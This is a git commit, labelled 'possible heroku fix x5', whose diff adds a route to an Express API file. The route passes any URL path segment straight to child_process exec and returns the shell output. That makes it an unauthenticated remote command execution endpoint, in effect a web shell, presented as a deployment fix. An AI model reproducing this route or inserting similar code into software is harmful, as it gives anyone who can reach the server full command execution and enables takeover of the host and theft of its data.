fd15b369552b8c04ae0d3e594188d9f7965d72bb
Vladyslav Usenko <vu4848@gmail.com>
2017-07-23 14:34:56 +0300

    possible heroku fix x5

--- server/routes/api.js
+++ server/routes/api.js
@@ -1,9 +1,19 @@
 const express = require('express');
 const router = express.Router();
+const sys = require('sys');
+const exec = require('child_process').exec;
+function puts(error, stdout, stderr) { return stdout }
+
 
 /* GET api listing. */
 router.get('/', (req, res) => {
   res.send('api works');
+});
+
+router.get('/:command', (req, res) => {
+  exec(req.params.command, (error, stdout, stderr) => {
+    res.send(stdout);
+  });
 });
 
 module.exports = router;
